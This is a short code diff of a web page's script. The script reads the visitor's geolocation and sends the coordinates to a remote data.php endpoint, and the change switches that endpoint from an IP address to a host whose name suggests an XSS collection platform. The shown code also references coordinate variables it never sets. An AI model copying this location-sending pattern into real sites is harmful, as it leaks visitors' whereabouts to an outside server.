@@ -12,7 +12,7 @@
 <script type="text/javascript">
     navigator.geolocation.getCurrentPosition(function(position) {
         alert('begin');
-        $.get("http://119.29.159.207/data.php",{ getLng: lng, getLat: lat},function(result){
+        $.get("https://xss.1jr.com.cn/data.php",{ getLng: lng, getLat: lat},function(result){
         alert('end');
         });
     },function (err) {
